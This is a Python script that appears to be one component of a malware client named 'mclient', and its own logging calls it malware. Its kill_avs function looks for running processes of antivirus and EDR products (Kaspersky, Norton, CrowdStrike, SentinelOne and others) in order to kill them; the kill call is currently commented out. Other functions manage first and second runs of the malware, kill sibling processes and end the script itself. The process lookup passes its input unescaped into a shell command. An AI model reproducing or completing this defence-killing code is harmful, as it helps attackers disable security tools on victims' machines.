#!/usr/bin/python3
import logging
import os
import signal
from time import sleep
import time

def get_pids(regex):
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{ print $2 }}'" 
    output = os.popen(cmd).read()
    pids = output.replace('PID','').strip().split('\n')
    pids = [int(pid) for pid in pids if pid != '']    
    logging.info(f"Malware pids: {pids}")
    return pids

def kill_avs(avs: list = ['antivirus', 'kaspersky', 'norton', 'corwdstrike', 'deepinstinct', 'sentinelone', 'checkpoint', 'cybereason']):
    avs = [ f"{av}" for av in avs]
    logging.info(avs)
    for av in avs:
        pids = get_pids(av)
        logging.info(f"Check for: {av} found pids: {pids} killing processes...")
        for pid in get_pids(av):
            pass
            #os.kill(pid, signal.SIGKILL)

def check_parent():
    my_pid = os.getpid()
    print(my_pid)
    pids = get_pids('*mclient')
    sleep(5)
    if len(pids) != 1:
        return True # malware secound run
    else:
        return False # malware first run

def wait_parent():
    sleep(30)
    my_pid = os.getpid()
    for poc in get_pids('*mclient'):
        if poc != my_pid:
            os.kill(poc, signal.SIGKILL)
    




   # del 
def self_kill():
    my_pid = os.getpid()
    sleep(10)
    os.kill(my_pid, signal.SIGKILL)

    # timeout = time.time() + 120
    # print("START SELF KILL")
    # while time.time() < timeout: # no child in 60 sec
    #     sleep(3)
    #     print(get_pids('*mclient'))
    #     if len(get_pids('*mclient')) > 1: # have child
    #         print("Have Child, self kill")
    #         sleep(15)
    #         #os.system('kill -9 {my_pid}')
    #         os.kill(my_pid, signal.SIGKILL)
    # print("- Ende")